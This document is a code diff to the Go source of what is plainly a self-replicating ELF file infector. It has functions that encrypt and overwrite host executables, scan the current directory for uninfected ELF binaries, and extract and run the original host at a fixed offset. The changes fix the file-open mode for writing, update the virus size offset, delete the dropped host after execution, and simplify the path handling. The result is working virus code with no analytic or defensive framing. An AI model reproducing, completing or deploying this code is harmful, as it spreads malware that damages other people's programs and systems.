@@ -100,7 +100,7 @@ func Infect(file string) {
     
     encDat := Encrypt(dat) //encrypt host
     
-    f, err := os.Open(file) //open host
+    f, err := os.OpenFile(file, os.O_RDWR , 0666) //open host
     check(err)
     
     w := bufio.NewWriter(f)
@@ -108,7 +108,6 @@ func Infect(file string) {
     w.Write(encDat) //write encypted host
     w.Flush() //make sure we are all set
     f.Close()
-    
 }
    
 func RunHost() {
@@ -121,12 +120,12 @@ func RunHost() {
     infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
     allSZ := len(infected_data) //get file full size
-    hostSZ := allSZ - 2665472 //calculate host size
+    hostSZ := allSZ - 2665984 //calculate host size
     
     f, err := os.Open(os.Args[0]) //open host
     check(err)
         
-    f.Seek(2665472, os.SEEK_SET) //go to host start
+    f.Seek(2665984, os.SEEK_SET) //go to host start
     
     hostBuf := make([]byte, hostSZ)
     f.Read(hostBuf) //read it
@@ -142,6 +141,7 @@ func RunHost() {
     os.Chmod(hostbytes, 0755) //give it proper permissions
     cmd := exec.Command(hostbytes) 
     cmd.Start() //execute it
+	os.Remove(hostbytes)
 }
  
 func Encrypt(toEnc []byte) []byte {
@@ -211,14 +211,11 @@ func main() {
     virPath := path.Base(os.Args[0])
     files, _ := ioutil.ReadDir(".")
     for _, f := range files { 
-            pwd, err := os.Getwd()
-            check(err)
-            fPath := pwd + "/" + f.Name()
-            
+            fPath := path.Base(f.Name())
             isELF := CheckELF(fPath)
-            if isELF == true  { 
+            if isELF == true { 
                 isInfected := CheckInfected(fPath)
-                if isInfected == false {
+                if isInfected == false { 
                     if fPath != virPath {
                         Infect(fPath)
                 }
@@ -226,7 +223,7 @@ func main() {
 		}
     }
         
-    if GetSz(os.Args[0]) > 2665472 {
+    if GetSz(os.Args[0]) > 2665984 {
         RunHost()
     } else {
         os.Exit(0)
